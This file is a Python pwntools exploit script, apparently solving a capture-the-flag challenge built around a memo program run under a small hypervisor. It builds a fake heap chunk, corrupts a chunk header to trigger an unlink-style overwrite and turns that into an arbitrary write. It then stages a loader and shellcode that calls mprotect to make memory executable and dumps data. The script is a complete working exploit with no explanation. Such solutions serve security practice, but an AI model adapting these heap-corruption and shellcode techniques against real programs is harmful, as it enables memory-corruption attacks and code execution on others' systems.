from pwn import *

def get_prompt():
	return p.recvuntil("0. Exit")

def Alloc(data):
	p.sendline("1")
	p.recvuntil("Input memo > ")
	p.send(data)
	get_prompt()

def Edit(idx,data):
	p.sendline("2")
	p.recvuntil("Input id > ")
	p.sendline(str(idx))
	p.recvuntil("Input memo > ")
	p.send(data)
	get_prompt()

def Delete(idx):
	p.sendline("3")
	p.recvuntil("Input id > ")
	p.sendline(str(idx))
	get_prompt()


def get_process(n=False):
	global native
	native = n
	if n:
		return process("../memo-static.elf")
	else:
		return process(["../kvm.elf","../kernel.bin","../memo-static.elf"])

context.os = 'linux'
context.arch = 'amd64'

e = ELF("../memo-static.elf")
p = get_process()

if native:
	memo = u64(p.leak(e.symbols['memo'],8)) + 0x10*1
else:
	memo = 0x7fff1ff000 + 0x10*1
	stack = 0x7fffffe000
	heap = 0x6050e0

log.info("memo: 0x%x"%memo)
fd,bk = memo-0x18,memo-0x10
fake_chunk = p64(0x0)+p64(0x51)+p64(fd)+p64(bk)

dis = '''
mov rax,0x10c8
syscall
mov r15,rax
'''

dis += shellcraft.mprotect('r15',0x1000,0x7)
dis += shellcraft.write(1,'r15',0x50)

shellcode = asm(dis)

dis = '''
mov rax,0
mov rdi,0
mov rsi,0x604000
mov rdx,{}
syscall
jmp rsi
'''.format(len(shellcode))

loader = asm(dis)


Alloc("A"*0x28)
Alloc(fake_chunk)
Alloc("B"*0x28)
Alloc("C"*0x28)
Alloc("D"*0x28)
Alloc("E"*0x28)


prevsize, newsize = 0x50,0x30 #remove prev_inuse bit
Edit(2,"B"*0x20+p64(prevsize)+chr(newsize))
Delete(3)

top_chunk = 0x604040 + 0x58

Edit(1,p32(top_chunk).strip("\x00"))
Edit(0,p32(0x604038).strip("\x00"))


Alloc("\x01"*0x28)
Alloc("\x02"*0x28)
Alloc(loader)

Alloc("\x04"*0x20+p64(memo+8)) #overwrite memo for arbitrary write

target = 0x7FFFFFFFE8

Alloc(p64(1)+p64(target)+p64(0)) #editing 3 will give you arbitrary write to target

Edit(3,p64(0x604048).strip("\x00"))

p.sendline("0")
p.send(shellcode)
p.interactive()